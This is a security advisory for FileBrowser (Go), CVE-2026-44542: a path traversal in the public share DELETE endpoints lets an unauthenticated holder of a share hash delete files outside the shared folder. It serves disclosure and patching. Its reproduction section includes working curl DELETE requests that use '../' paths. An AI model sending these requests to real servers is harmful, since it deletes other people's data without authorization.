# [C] FileBrowser Public Share DELETE API Path Traversal Allows Unauthenticated Arbitrary File Deletion

## Summary
Severity: Critical
Advisory: GHSA-fwj3-42wh-8673
CVE: CVE-2026-44542
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-fwj3-42wh-8673
Type: github-advisory

## Affected
- Go: `github.com/gtsteffaniak/filebrowser` — affected >=0 <0.0.0-20260501183844-112740bdd41d

## Details
### **Summary**

Attacker-controlled path input is joined with a trusted base path prior to sanitization, allowing traversal sequences (e.g., ../) to escape the intended shared directory. As a result, an unauthenticated attacker possessing a valid public share hash with delete permissions enabled can delete arbitrary files outside the shared directory within the share owner’s configured storage scope.

### **Affected Components**

**Two distinct vulnerable code paths:**

1. Stable versions (e.g., gtstef/filebrowser:stable)
`DELETE /public/api/resources?hash=<hash>&path=../victim`
Root cause: middleware.go:111
Issue: path query parameter is joined before SanitizeUserPath()
2. Development / HEAD (e.g., commit eabdfd9)
`DELETE /public/api/resources/bulk?hash=<hash>`
Body: [{"path":"../victim"}]
Root cause: resource.go:274
Issue: item.Path is joined before SanitizeUserPath()

### **Steps to reproduce (Stable Version)**

**1. Create a directory structure:**

```
/folder/shared_subdir/   (shared)
/folder/protected.txt    (outside shared directory)
```

**2. Create a public share:**
```
Path: /shared_subdir
AllowDelete=true
```

**3. Send request:**

```
curl -X DELETE "http://localhost/public/api/resources?hash=<HASH>&path=../protected.txt"

#Observe:
#protected.txt is deleted despite being outside the shared directory
```

### **Proof of Concept (HEAD / bulk endpoint)**

```
curl -X DELETE "http://localhost/public/api/resources/bulk?hash=<HASH>" \
  -H "Content-Type: application/json" \
  -d '[{"path":"../protected.txt"}]'
```

### **Alternative PoC Scripts:**
[poc_v3.sh](https://github.com/user-attachments/files/26159404/poc_v3.sh) (**If the script fails due to environment differences, the manual PoC above reliably reproduces the issue.**)


### **Impact**
An unauthenticated attacker with access to a public share link configured with delete permissions enabled can delete attacker-chosen files outside the shared directory, anywhere within the share owner’s storage scope. This results in unauthorized data loss and potential service disruption.

## References
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673
- https://nvd.nist.gov/vuln/detail/CVE-2026-44542
- https://github.com/gtsteffaniak/filebrowser/commit/112740bdd41de7d5eb01e13ba49d406bfc463f69
- https://github.com/gtsteffaniak/filebrowser
